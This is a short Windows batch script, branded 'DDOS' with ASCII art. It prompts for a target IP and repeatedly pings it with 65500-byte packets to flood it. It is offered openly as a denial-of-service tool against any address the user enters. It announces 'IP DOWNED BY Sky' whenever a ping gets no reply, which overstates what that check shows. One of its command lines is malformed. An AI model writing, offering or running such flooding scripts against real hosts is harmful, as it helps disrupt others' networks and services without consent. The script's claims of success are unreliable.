@echo off
color A
title DDOS


echo         DDDDD   DDDDD    OOOOO   SSSSS  
echo         DD  DD  DD  DD  OO   OO SS      
echo         DD   DD DD   DD OO   OO  SSSSS  
echo         DD   DD DD   DD OO   OO      SS 
echo         DDDDDD  DDDDDD   OOOOO   SSSSS  
echo         ===============================
echo         =      CTRL+C TO STOP PINGING =
echo         ===============================

set /p IP=Enter IP to Ping:
:top
ping -l 65500 -n 1 %IP% | FIND "TTL="
title :: Pinging: %IP% ::
IF ERRORLEVEL 1 (echo IP DOWNED BY Sky)
set /a num=(%Random%%%9)+1
color %num%
ping -t 1 0 100 127.0.0.1 >nul
GoTo top